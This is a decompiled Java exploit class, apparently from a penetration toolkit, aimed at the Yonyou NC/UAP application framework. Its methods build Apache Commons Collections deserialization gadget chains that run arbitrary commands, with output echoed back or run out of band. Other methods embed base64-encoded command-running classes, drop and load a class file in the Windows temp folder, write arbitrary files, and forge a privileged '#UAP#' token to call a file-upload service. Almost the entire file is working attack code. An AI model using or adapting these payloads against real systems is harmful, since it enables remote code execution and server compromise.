//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package sample.module.payload;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Properties;
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.common.NCLocator;
import nc.bs.framework.comn.NetStreamContext;
import nc.bs.framework.core.common.ConfigMetaVO;
import nc.bs.framework.core.common.IConfigMetaService;
import nc.bs.framework.core.conf.Configuration;
import nc.bs.framework.exception.FrameworkRuntimeException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.granite.lang.util.HexEncoder;
import org.mozilla.javascript.DefiningClassLoader;
import sample.util.Reflections;
import sample.util.ToEncode;
import sun.misc.BASE64Decoder;

public class NcPoc {
    public NcPoc() {
    }

    public byte[] NcEcho(String command) throws Exception {
        String data = "yv66vgAAADMAjAoAIABECgBFAEYHAEcIAEgKAEkASgoACQBLCABMCgAJAE0HAE4IAE8IAFAIAFEIAFIKAFMAVAoAUwBVCgBWAFcHAFgKABEAWQgAWgoAEQBbCgARAFwKABEAXQgAXgcAXwoARQBgCwBhAGIKABgAYwoAGABkCgAYAGUKABgAZgcAZwcAaAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTE5DZXhwOwEACnJldmVyc2VDbWQBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdjb21tYW5kAQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVzAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEAA3N0cgEAAnB3AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcARwcATgcAMgcAaQcAWAEACkV4Y2VwdGlvbnMHAGoBAApTb3VyY2VGaWxlAQAKTkNleHAuamF2YQwAIQAiBwBrDABsAG0BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAHb3MubmFtZQcAbgwAbwBwDABxAHIBAAN3aW4MAHMAdAEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB1DAB2AHcMAHgAeQcAegwAewB8AQARamF2YS91dGlsL1NjYW5uZXIMACEAfQEAAlxhDAB+AH8MAIAAgQwAggByAQAAAQATamF2YS9pby9QcmludFdyaXRlcgwAgwCEBwCFDACGAIcMACEAiAwAiQApDACKACIMAIsAIgEABU5DZXhwAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAqbmMvYnMvZnJhbWV3b3JrL3NlcnZlci9DbGllbnRSZXF1ZXN0SG9sZGVyAQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAEmdldFNlcnZsZXRSZXNwb25zZQEAISgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAPZ2V0T3V0cHV0U3RyZWFtAQAlKClMamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtOwEAGShMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAAV3cml0ZQEABWZsdXNoAQAFY2xvc2UAIQAfACAAAAAAAAIAAQAhACIAAQAjAAAALwABAAEAAAAFKrcAAbEAAAACACQAAAAGAAEAAAAHACUAAAAMAAEAAAAFACYAJwAAAAkAKAApAAIAIwAAAXcABAAJAAAAorgAAsAAA0wEPRIEuAAFTi3GABEttgAGEge2AAiZAAUDPRyZABgGvQAJWQMSClNZBBILU1kFKlOnABUGvQAJWQMSDFNZBBINU1kFKlM6BLgADhkEtgAPtgAQOgW7ABFZGQW3ABISE7YAFDoGGQa2ABWZAAsZBrYAFqcABRIXOge7ABhZuAAZuQAaAQC3ABs6CBkIGQe2ABwZCLYAHRkItgAesQAAAAMAJAAAADoADgAAAAkABwAKAAkACwAPAAwAHwANACEADwBOABAAWwARAGsAEgB/ABMAkAAUAJcAFQCcABYAoQAXACUAAABcAAkAAACiACoAKwAAAAcAmwAsAC0AAQAJAJkALgAvAAIADwCTADAAKwADAE4AVAAxADIABABbAEcAMwA0AAUAawA3ADUANgAGAH8AIwA3ACsABwCQABIAOAA5AAgAOgAAACEABf4AIQcAOwEHADwYUQcAPf4ALgcAPQcAPgcAP0EHADwAQAAAAAQAAQBBAAEAQgAAAAIAQw==";
        String className = "NCexp";
        String method = "reverseCmd";
        byte[] classBytes = (new BASE64Decoder()).decodeBuffer(data);
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, classBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer(method, new Class[]{String.class}, new Object[]{command}), new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var21) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var20) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])((Object[])f2.get(innimpl)));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var19) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getBytes(map);
        return bytes;
    }

    public byte[] NcOOB1(String command) throws Exception {
        String[] execArgs = new String[]{command};
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var18) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var17) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var16) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getBytes(map);
        return bytes;
    }

    public byte[] NcOOB2(String command) throws Exception {
        String[] execArgs = new String[]{command};
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var18) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var17) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var16) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getNcBytes(map);
        return bytes;
    }

    public byte[] NcAddClass() throws Exception {
        String TempFilePath = "c:/windows/Temp/NC.class";
        String data = "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";
        byte[] classBytes = (new BASE64Decoder()).decodeBuffer(data);
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{TempFilePath}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{classBytes})};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var19) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var18) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])((Object[])f2.get(innimpl)));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var17) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getBytes(map);
        return bytes;
    }

    public byte[] NcLoaderClass(String command) throws Exception {
        String ClassPath = "file:/c:/windows/Temp/";
        String className = "NC";
        String method = "reverseCmd";
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(ClassPath)}}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{method, new Class[]{String.class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new String[]{command}})};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var20) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var19) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])((Object[])f2.get(innimpl)));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var18) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getBytes(map);
        return bytes;
    }

    public byte[] NcUpload(String filePath, String file) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InstantiateTransformer(new Class[]{String.class, Boolean.TYPE}, new Object[]{filePath, false}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{file.getBytes()}), new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var18) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var17) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var16) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getBytes(map);
        return bytes;
    }

    public byte[] NcUpload(String httpURL, String filePath, String file) throws Exception {
        Properties prop = new Properties();
        prop.setProperty("SERVICEDISPATCH_URL", httpURL);
        IConfigMetaService object = (IConfigMetaService)NCLocator.getInstance(prop).lookup(IConfigMetaService.class.getName());
        ConfigMetaVO configMetaVO = object.getConfigMetaVO();
        Configuration c = configMetaVO.getConfiguration();
        new ByteArrayOutputStream();
        String serviceName = "nc.itf.uap.busibean.IFileManager";
        String methodName = "upLoadFile";
        Class<?>[] parameterTypes = new Class[]{String.class, byte[].class};
        Object[] parameters = new Object[]{filePath, file.getBytes()};
        String clientHost = "";
        byte[] token = genToken("#UAP#", strTohex(c.getPriviledgedToken()), c.getTokenSeed());
        NetStreamContext.setToken(token);
        InvocationInfo info = new InvocationInfo((String)null, serviceName, methodName, parameterTypes, parameters, clientHost);
        info.setUserDataSource("design");
        info.setLangCode("simpchn");
        info.setUserId("#UAP#");
        info.setCallId(System.currentTimeMillis() + "");
        byte[] bytes = ToEncode.getNcBytes(info);
        return bytes;
    }

    public byte[] NcUpload2(String filePath, String file) throws Exception {
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InstantiateTransformer(new Class[]{String.class, Boolean.TYPE}, new Object[]{filePath, false}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{file.getBytes()}), new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var18) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap)f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var17) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[])((Object[])f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var16) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        byte[] bytes = ToEncode.getNcBytes(map);
        return bytes;
    }

    private static byte[] genToken(String userCode, byte[] origin, String token) {
        byte[] userid = userCode.getBytes();
        long now = System.currentTimeMillis();
        byte[] tokenBytes = new byte[8 + origin.length + userid.length];
        writeLong(tokenBytes, now);
        System.arraycopy(origin, 0, tokenBytes, 8, origin.length);
        System.arraycopy(userid, 0, tokenBytes, 8 + origin.length, userid.length);
        byte[] md5 = md5(strTohex(token), tokenBytes);
        byte[] nbytes = new byte[origin.length + md5.length + 8];
        System.arraycopy(tokenBytes, 0, nbytes, 0, origin.length + 8);
        System.arraycopy(md5, 0, nbytes, 8 + origin.length, md5.length);
        return nbytes;
    }

    private static byte[] md5(byte[] key, byte[] tokens) {
        MessageDigest md = null;

        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(tokens);
            md.update(key);
            return md.digest();
        } catch (Exception var4) {
            throw new FrameworkRuntimeException("md5 error", var4);
        }
    }

    private static byte[] strTohex(String str) {
        HexEncoder e = new HexEncoder();
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        try {
            e.decode(str, out);
        } catch (IOException var4) {
            throw new FrameworkRuntimeException("error tokend seed", var4);
        }

        return out.toByteArray();
    }

    private static void writeLong(byte[] writeBuffer, long v) {
        writeBuffer[0] = (byte)((int)(v >>> 56));
        writeBuffer[1] = (byte)((int)(v >>> 48));
        writeBuffer[2] = (byte)((int)(v >>> 40));
        writeBuffer[3] = (byte)((int)(v >>> 32));
        writeBuffer[4] = (byte)((int)(v >>> 24));
        writeBuffer[5] = (byte)((int)(v >>> 16));
        writeBuffer[6] = (byte)((int)(v >>> 8));
        writeBuffer[7] = (byte)((int)(v >>> 0));
    }
}
